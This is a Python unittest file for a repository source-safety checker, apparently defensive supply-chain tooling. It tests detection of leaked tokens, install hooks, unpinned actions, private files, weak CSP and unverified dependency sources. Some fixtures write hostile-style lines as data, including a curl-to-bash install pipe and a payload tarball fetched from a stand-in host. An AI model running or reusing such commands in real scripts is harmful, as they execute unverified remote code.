"""Exercise the policy checker against synthetic repositories, never real secrets."""
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

CHECKER = Path(__file__).resolve().parents[1] / 'scripts/check-source-safety.py'


class SourceSafetyTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='memory-policy-')
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name) / 'repository'
        self.root.mkdir()
        subprocess.run(['git', 'init', '-q', str(self.root)], check=True)
        self.write('src/lib.rs', 'pub fn local_only() {}\n')

    def write(self, name, contents):
        path = self.root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(contents)
        subprocess.run(['git', '-C', str(self.root), 'add', name], check=True)
        return path

    def check(self):
        # The explicit existence assertion makes the initial RED useful even
        # before the command exists; successful fixtures exercise its CLI.
        self.assertTrue(CHECKER.is_file(), 'Source safety checker is not implemented')
        return subprocess.run([sys.executable, str(CHECKER), '--root', str(self.root)],
                              text=True, capture_output=True)

    def npm_package(self, scripts=None, resolved='https://registry.npmjs.org/example/-/example-1.0.0.tgz', integrity='sha512-Zml4dHVyZQ=='):
        self.write('tooling/example/package.json', json.dumps({'name': 'fixture', 'private': True,
                   'dependencies': {'example': '1.0.0'}, 'scripts': scripts or {}}))
        dependency = {'version': '1.0.0', 'resolved': resolved}
        if integrity is not None:
            dependency['integrity'] = integrity
        self.write('tooling/example/package-lock.json', json.dumps({'lockfileVersion': 3,
                   'packages': {'': {'name': 'fixture', 'dependencies': {'example': '1.0.0'}},
                                'node_modules/example': dependency}}))

    def test_accepts_literal_local_source_and_immutable_action(self):
        self.write('.github/workflows/test.yml', 'jobs:\n  test:\n    steps:\n      - uses: actions/checkout@' + 'a' * 40 + '\n')
        self.npm_package()
        result = self.check()
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn('not a malware', result.stdout)

    def test_secret_failure_never_echoes_the_sensitive_value(self):
        secret = 'ghp_' + 'a' * 36
        self.write('src/leak.rs', 'const TOKEN: &str = "' + secret + '";\n')
        result = self.check()
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn('secret-pattern', result.stdout)
        self.assertNotIn(secret, result.stdout + result.stderr)

    def test_blocks_runtime_shell_and_network_expansion(self):
        for path, code in [('src/runner.rs', 'std::process::' + 'Command::new("sh");'),
                           ('apps/studio/src/upload.ts', 'f' + 'etch("https://example.invalid");')]:
            with self.subTest(path=path):
                target = self.write(path, code)
                result = self.check()
                self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
                self.assertIn('runtime-boundary', result.stdout)
                target.unlink()
                subprocess.run(['git', '-C', str(self.root), 'rm', '--cached', path], check=True, capture_output=True)

    def test_rejects_install_hook_without_running_it(self):
        marker = self.root / 'executed'
        self.npm_package({'postinstall': 'touch executed'})
        result = self.check()
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn('install-hook', result.stdout)
        self.assertFalse(marker.exists())

    def test_rejects_non_registry_dependency_and_missing_integrity(self):
        for resolved, integrity, rule in [('https://example.invalid/payload.tgz', 'sha512-Zml4dHVyZQ==', 'dependency-source'),
                                          ('https://registry.npmjs.org/example/-/example-1.0.0.tgz', None, 'dependency-integrity')]:
            with self.subTest(rule=rule):
                self.npm_package(resolved=resolved, integrity=integrity)
                result = self.check()
                self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
                self.assertIn(rule, result.stdout)

    def test_rejects_mutable_action_reference(self):
        for reference in ['actions/checkout@v4', '"actions/checkout@v4"', '"\n      actions/checkout@v4\n    "']:
            with self.subTest(reference=reference):
                self.write('.github/workflows/test.yml', 'steps:\n  - uses: ' + reference + '\n')
                result = self.check()
                self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
                self.assertIn('action-pin', result.stdout)

    @unittest.skipIf(sys.platform == 'win32', 'Symlink creation requires optional Windows privileges')
    def test_rejects_symlink_without_reading_its_target(self):
        target = Path(self.temp.name) / 'private.txt'
        secret = 'ghp_' + 'b' * 36
        target.write_text(secret)
        link = self.root / 'src/external.rs'
        link.symlink_to(target)
        subprocess.run(['git', '-C', str(self.root), 'add', 'src/external.rs'], check=True)
        result = self.check()
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn('source-link', result.stdout)
        self.assertNotIn(secret, result.stdout + result.stderr)
        self.assertNotIn('secret-pattern', result.stdout)
        self.assertEqual(target.read_text(), secret)

    def test_rejects_secret_database_files_in_source(self):
        self.write('.env', 'TOKEN=synthetic\n')
        self.write('backup/memory.sqlite', 'synthetic database')
        result = self.check()
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn('private-file', result.stdout)
        self.assertNotIn('TOKEN=synthetic', result.stdout + result.stderr)

    def test_rejects_weakened_production_csp(self):
        self.write('apps/studio/src-tauri/tauri.conf.json', json.dumps({'app': {'security': {
            'csp': "default-src 'self'; script-src 'self' https:; connect-src ipc: http://ipc.localhost; object-src 'none'; form-action 'none'"}}}))
        result = self.check()
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn('native-csp', result.stdout)

    def test_rejects_unverifiable_cargo_source(self):
        self.write('Cargo.lock', 'version = 4\n[[package]]\nname = "example"\nversion = "1.0.0"\nsource = "git+https://example.invalid/repo"\n')
        result = self.check()
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn('dependency-source', result.stdout)

    def test_rejects_remote_install_pipe(self):
        self.write('scripts/install.sh', 'c' + 'url https://example.invalid/install | b' + 'ash\n')
        result = self.check()
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn('remote-execution', result.stdout)


if __name__ == '__main__':
    unittest.main()
